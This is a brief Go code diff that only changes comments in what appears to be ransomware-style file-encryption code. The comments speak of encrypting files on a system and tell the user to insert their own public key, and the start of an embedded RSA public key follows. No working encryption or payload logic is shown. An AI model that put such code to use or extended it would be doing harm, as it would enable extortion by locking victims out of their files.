@@ -16,7 +16,7 @@ func isFirstTime() bool {
 
 func initialize() {
 
-	// Only proceed if it is the first time. Encrypting the whole system multiple times would be bad.
+	// Only proceed if it is the first time. Encrypting the same files multiple times would be bad.
 	if !isFirstTime() {
 		return
 	}
@@ -28,6 +28,7 @@ func initialize() {
 	}
 
 	// Add your own public key here. Make sure there are no tabs or whitespace.
+	// This example key was generated with the rsa.GenerateKey() function.
 	const pubPEM = `
 -----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwcMcLEUzBFFsNGaTW80d
